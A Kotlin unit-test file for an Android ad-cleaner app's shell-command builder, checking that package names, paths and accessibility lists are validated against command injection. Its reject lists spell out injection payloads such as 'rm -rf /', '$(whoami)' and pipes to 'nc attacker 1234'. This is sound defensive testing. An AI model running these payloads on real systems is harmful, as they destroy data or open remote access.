package cn.adcalm.guard.core

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * shell 命令构造的测试。
 *
 * 重点是**注入防护**：包名和路径都会被拼进命令行，这里漏一个就等于开了后门。
 */
class ShellCommandsTest {

    // ---- 包名校验 ----

    @Test
    fun `正常包名被接受`() {
        val ok = listOf(
            "com.example.browser",
            "cn.adcalm.guard",
            "com.a.b.c.d",
            "com.example.app_2",
        )
        for (p in ok) {
            assertTrue("$p 应被接受", ShellCommands.isValidPackage(p))
        }
    }

    @Test
    fun `命令注入的包名被拒绝`() {
        val bad = listOf(
            "com.a; rm -rf /",
            "com.a && reboot",
            "com.a | nc attacker 1234",
            "com.a`id`",
            "com.a\$(whoami)",
            "com.a\nreboot",
            "com.a'",
            "com.a\"",
            "com.a > /sdcard/x",
            "com.a\\",
            "com.a&",
            "../etc/passwd",
        )
        for (p in bad) {
            assertFalse("$p 必须被拒绝", ShellCommands.isValidPackage(p))
            assertNull("非法包名不该产出命令：$p", ShellCommands.forceStop(p))
        }
    }

    @Test
    fun `单段和空包名被拒绝`() {
        assertFalse(ShellCommands.isValidPackage(""))
        assertFalse(ShellCommands.isValidPackage("single"))
        assertFalse(ShellCommands.isValidPackage("com."))
        assertFalse(ShellCommands.isValidPackage(".com.a"))
        assertFalse("数字开头不合法", ShellCommands.isValidPackage("1com.a"))
    }

    @Test
    fun `超长包名被拒绝`() {
        assertFalse(ShellCommands.isValidPackage("com." + "a".repeat(300)))
    }

    // ---- 命令构造 ----

    @Test
    fun `强停命令格式正确`() {
        assertEquals("am force-stop com.example.browser", ShellCommands.forceStop("com.example.browser"))
    }

    @Test
    fun `查询进程命令格式正确`() {
        assertEquals("pidof com.example.browser", ShellCommands.isPackageRunning("com.example.browser"))
        assertNull(ShellCommands.isPackageRunning("com.a; id"))
    }

    @Test
    fun `删除文件的路径被引号包住并用双横线终止选项`() {
        assertEquals(
            "rm -f -- '/sdcard/Download/ad.apk'",
            ShellCommands.deleteFile("/sdcard/Download/ad.apk"),
        )
    }

    @Test
    fun `含 shell 元字符的路径被拒绝`() {
        val bad = listOf(
            "/sdcard/a; rm -rf /",
            "/sdcard/a\$(id)",
            "/sdcard/a`id`",
            "/sdcard/a\"b",
            "/sdcard/a'b",
            "/sdcard/a|b",
            "/sdcard/a&b",
            "/sdcard/a\nb",
            "relative/path",
            "",
        )
        for (p in bad) {
            assertNull("危险路径必须被拒绝：$p", ShellCommands.deleteFile(p))
        }
    }

    @Test
    fun `带空格和中文的路径可以安全删除`() {
        // 真实场景：下载目录里叫「广告 安装包.apk」的文件
        assertEquals(
            "rm -f -- '/sdcard/Download/广告 安装包.apk'",
            ShellCommands.deleteFile("/sdcard/Download/广告 安装包.apk"),
        )
    }

    // ---- 无障碍绑定列表 ----

    @Test
    fun `写回无障碍绑定列表`() {
        val component = "cn.adcalm.guard/cn.adcalm.guard.service.AdCalmAccessibilityService"
        assertEquals(
            "settings put secure enabled_accessibility_services '$component'",
            ShellCommands.setAccessibilityList(component),
        )
    }

    @Test
    fun `多服务列表用冒号分隔并整体加引号`() {
        val list = "com.a/.A:cn.adcalm.guard/.S"
        assertEquals(
            "settings put secure enabled_accessibility_services '$list'",
            ShellCommands.setAccessibilityList(list),
        )
    }

    @Test
    fun `绑定列表里混进非法项时整体拒绝`() {
        // 这个值带 `:` 分隔符，看起来"像个列表"，很容易误以为可以放松校验。
        // 放松了就是命令注入——列表里只要有一项不干净，整条命令都不能发。
        val bad = listOf(
            "cn.adcalm.guard/.S; rm -rf /",
            "cn.adcalm.guard/.S:evil/x\$(whoami)",
            "cn.adcalm.guard/.S:cn.a/.B&&reboot",
            "cn.adcalm.guard/.S:`id`",
            "cn.adcalm.guard/.S:",
            "cn.adcalm.guard/.S:not-a-component",
            "",
        )
        for (list in bad) {
            assertNull("应当拒绝：$list", ShellCommands.setAccessibilityList(list))
        }
    }

    @Test
    fun `超长列表被拒绝`() {
        assertNull(ShellCommands.setAccessibilityList("a" + ".b/c".repeat(3000)))
    }

    @Test
    fun `读取绑定列表的命令是固定的，不接受任何参数`() {
        // 没有参数就没有注入面。
        assertEquals(
            "settings get secure enabled_accessibility_services",
            ShellCommands.getAccessibilityList(),
        )
    }

    // ---- 把用户送回原应用 ----

    @Test
    fun `启动应用带全限定类名`() {
        val cmd = ShellCommands.startApp("com.example.app", "com.example.app.MainActivity")
        assertEquals(
            "am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER " +
                "-n 'com.example.app/com.example.app.MainActivity'",
            cmd,
        )
    }

    @Test
    fun `包名或类名含 shell 元字符时拒绝`() {
        // 两个参数都会被拼进命令行，任一个不干净整条命令都不能发。
        val bad = listOf(
            "com.a; rm -rf /" to "com.a.MainActivity",
            "com.a" to "com.a.MainActivity; rm -rf /",
            "com.a" to "com.a.MainActivity\$(whoami)",
            "com.a" to "com.a.MainActivity`id`",
            "com.a" to "com.a.MainActivity'",
            "com.a" to "com.a.MainActivity|nc evil 1234",
            "com.a" to "",
            "" to "com.a.MainActivity",
        )
        for ((pkg, cls) in bad) {
            assertNull("应当拒绝：$pkg / $cls", ShellCommands.startApp(pkg, cls))
        }
    }

    @Test
    fun `短形式类名被拒绝——am start 要的是完整组件`() {
        // 无障碍绑定列表里允许 `.MainActivity` 这种写法（Android 组件名支持），
        // 但那是喂给 settings 的值，不是喂给命令行的组件。这条钉住两者不混用。
        assertNull(ShellCommands.startApp("com.example.app", ".MainActivity"))
    }

    // ---- 广告安装包清理 ----

    @Test
    fun `扫描命令覆盖所有安装包扩展名`() {
        val cmd = ShellCommands.listPackages("/sdcard/Android/data")!!
        assertTrue(cmd.startsWith("find '/sdcard/Android/data'"))
        for (suffix in AdPackageCleaner.SUFFIXES) {
            assertTrue("缺少 .$suffix：$cmd", cmd.contains("-name '*.$suffix'"))
        }
    }

    @Test
    fun `扫描命令不能依赖 find 的 -exec 和 -newer`() {
        // 两个都是这台 ROM 上实测不支持的：`-exec ... +` 静默返回空，
        // `-newer` / `-newermt` 干脆不认。所以只能是"find 列路径 + while read + stat"，
        // 时间过滤拿回应用层做。这条防止以后有人"顺手优化"回去。
        val cmd = ShellCommands.listPackages("/sdcard/Android/data")!!
        assertFalse(cmd.contains("-exec"))
        assertFalse(cmd.contains("-newer"))
        assertTrue(cmd.contains("while read -r f"))
        assertTrue(cmd.contains("stat -c '%s %Y %n'"))
    }

    @Test
    fun `改名安装包的扫描命令：读头部也读尾部，且不整份读`() {
        val cmd = ShellCommands.listRenamedPackages("/sdcard/Android/data")!!
        assertTrue("要有大小下限，缓存目录里到处是碎片", cmd.contains("-size +1M"))
        assertTrue("已知扩展名要跳过，否则和第一趟重复", cmd.contains("*.apk") && cmd.contains("continue"))
        assertTrue("读头部", cmd.contains("dd if=") && cmd.contains("count=64"))
        assertTrue(
            "还要读尾部：真 APK 的清单名在中央目录里（实测偏移 18.5M/22M），只读头部会漏",
            cmd.contains("tail -c 262144")
        )
        assertFalse("这台 ROM 的 find 不支持这些", cmd.contains("-exec"))
        assertFalse(cmd.contains("-newer"))
    }

    @Test
    fun `扫描根目录不合法时拒绝`() {
        for (bad in listOf("", "relative/dir", "/sdcard/a'b", "/sdcard/a;rm -rf /", "/sdcard/a\$(id)")) {
            assertNull("应当拒绝：$bad", ShellCommands.listPackages(bad))
        }
    }

    @Test
    fun `移动文件`() {
        assertEquals(
            "mv -f -- '/sdcard/Android/data/a/b.apk' '/sdcard/.AdCalmQuarantine/123_b.apk'",
            ShellCommands.moveFile("/sdcard/Android/data/a/b.apk", "/sdcard/.AdCalmQuarantine/123_b.apk"),
        )
    }

    @Test
    fun `移动时任一路径不干净都拒绝`() {
        val bad = listOf(
            "/sdcard/a.apk" to "/sdcard/b'; rm -rf /'",
            "/sdcard/a\$(id).apk" to "/sdcard/b",
            "/sdcard/a.apk" to "relative",
            "/sdcard/a.apk" to "",
        )
        for ((src, dest) in bad) {
            assertNull("应当拒绝：$src -> $dest", ShellCommands.moveFile(src, dest))
        }
    }

    @Test
    fun `路径白名单单独可测`() {
        assertTrue(ShellCommands.isSafePath("/sdcard/Android/data/x.apk"))
        assertTrue(ShellCommands.isSafePath("/sdcard/Download/广告 安装包.apk"))
        assertFalse(ShellCommands.isSafePath("sdcard/x"))
        assertFalse(ShellCommands.isSafePath("/sdcard/`id`"))
        assertFalse(ShellCommands.isSafePath("/sdcard/x|y"))
        assertFalse(ShellCommands.isSafePath("/sdcard/x\ny"))
    }
}
